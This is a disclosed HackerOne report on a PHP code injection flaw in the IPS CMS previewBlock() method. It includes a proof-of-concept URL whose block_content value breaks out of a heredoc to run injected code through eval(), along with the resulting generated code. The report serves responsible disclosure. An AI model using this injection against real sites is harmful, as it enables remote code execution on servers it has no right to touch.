---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1092574'
original_report_id: '1092574'
title: PHP Code Injection through "previewBlock()" method
weakness: Code Injection
team_handle: ips
created_at: '2021-02-02T00:04:38.432Z'
disclosed_at: '2021-05-28T16:50:01.312Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 26
tags:
- hackerone
- code-injection
---

# PHP Code Injection through "previewBlock()" method

## Metadata

- HackerOne Report ID: 1092574
- Weakness: Code Injection
- Program: ips
- Disclosed At: 2021-05-28T16:50:01.312Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
The vulnerability exists because the `IPS\cms\modules\front\pages\_builder::previewBlock()` method allows to pass arbitrary content to the `IPS\_Theme::runProcessFunction()` method, which will be used in a call to the `eval()` function. This can be exploited to inject and execute arbitrary PHP code.

**Steps To Reproduce:**

- Login as an user with permission to manage the sidebar 
- Browse to the following URL:

```
http://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*
```

- This will result in the following PHP code to be passed to the `eval()` function from the `IPS\_Theme::runProcessFunction()` method:

```
namespace IPS\Theme;
class class_content_template_for_block_
{
	function run(  ) {
		$return = '';
		$return .= <<<CONTENT

RCE
CONTENT;}}phpinfo();die;/*
CONTENT;

		return $return;
}}
```

- As a result, the `phpinfo()` function will be executed

## Impact

A malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the "cms" application to be enabled.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
